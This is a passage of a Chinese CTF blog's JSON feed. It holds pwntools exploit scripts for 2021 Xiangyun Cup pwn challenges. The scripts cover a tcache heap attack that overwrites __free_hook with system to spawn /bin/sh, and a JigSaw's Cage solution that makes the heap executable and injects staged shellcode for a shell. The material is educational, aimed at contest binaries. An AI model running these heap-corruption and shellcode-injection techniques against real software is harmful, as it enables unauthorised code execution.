class=\"token punctuation\">,</span>tcache_max_bins<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x538</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nfd <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nfdn <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fd'</span><span class=\"token punctuation\">,</span>fd<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fdn'</span><span class=\"token punctuation\">,</span>fdn<span class=\"token punctuation\">)</span>\n\nfake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> fd <span class=\"token punctuation\">,</span> fd <span class=\"token punctuation\">,</span> fdn <span class=\"token punctuation\">,</span> tcache_max_bins <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.address'</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x530</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"jigsawscage\"><a class=\"markdownIt-Anchor\" href=\"#jigsawscage\">#</a> JigSaw’sCage</h1>\n<p>说实话，不难，但不知道为啥比赛时没深做</p>\n<p>另外参照了 W&amp;M 战队的方法：<a href=\"https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247487347&amp;idx=3&amp;sn=74341c2480b155981da8081905dac97f&amp;chksm=9760fba5a01772b3ba7bd69d2d71a86c4471f0a611e31daa142304894d90eeeeb2ce5670e840&amp;mpshare=1&amp;scene=23&amp;srcid=0823b7LlkWG06N5TrXGRFt4w&amp;sharer_sharetime=1629698711378&amp;sharer_shareid=a2525076fb7710235921c4462953ffb5#rd\">祥云杯 2021 By W&amp;M（Pwn）部分 (qq.com)</a></p>\n<p>这题就更加明显了，直接可以让你执行长度小于 0x10 的 shellcode，但前提是让堆有执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/8.png\" alt=\"1\"></p>\n<p>在最开始的时候有个洞 v1 只是整形，而可以输入长整形，那么我们可以把下面的随机数也一起控制了</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/image-20210830212630568.png\" alt=\"image-20210830212630568\"></p>\n<p>这样就让堆有了执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1-16303300733865.png\" alt=\"1\"></p>\n<p>话说我看了挺多 wp，发现还是 wjh 师傅的 shellcode 最简单，充分考虑到了执行 shellcode 时各个寄存器的情况</p>\n<p>rax 为 0 刚好可以作为 read 的系统调用号，rdx 为执行的 shellcode 地址，刚好可以作为 read 的写入地址，之后直接读入大段 shellcode 即可</p>\n<p>再贴一下 Aidai 爷的短 shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rsp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">';jmp rsp'</span><span class=\"token punctuation\">)</span></code></pre>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/shellcode.png\" alt=\"执行shellcode寄存器情况\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./JigSAW'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">0</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'iNput:'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'niayh'</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Make your Choice:'</span><span class=\"token punctuation\">,</span>u64<span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 首先通过溢出修改执行权限</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nxor rdi, rdi\nmov rsi, rdx\nmov rdx, 0x1000\nsyscall\n'''</span>\n<span class=\"token comment\"># 这里的 shellcode 因为长度受限，需要充分利用调用时各个寄存器的值</span>\n<span class=\"token comment\"># 程序使用了 call rdx ，这里 rdx 为 heap 段地址，还把 rax 给置 0 </span>\n<span class=\"token comment\"># 我们就可以进行 0 号系统调用 read 读到我们正在执行的 heap 中</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"len\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 系统调用 read 读入 </span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\ntest<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nse<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x90'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 因为程序刚好在执行这段上面这条汇编</span>\n<span class=\"token comment\"># 这样操作刚好属于在执行的过程中把要执行的代码修改了</span>\n<span class=\"token comment\"># wjh 师傅tql，使用 nop 指令滑到 shellcode</span>\n\n<span class=\"token comment\"># 当然也可以多次对小片段 shellcode 来利用</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   JigSAW.py\n@Time    :   2021/08/24 17:58:53\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"还有一道c嘉嘉写的pwn我先学一些再来复现\"><a class=\"markdownIt-Anchor\" href=\"#还有一道c嘉嘉写的pwn我先学一些再来复现\">#</a> 还有一道 C 嘉嘉写的 pwn，我先学一些再来复现</h1>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "堆",
                "IO_FILE",
                "祥云杯"
            ]
        }
    ]
}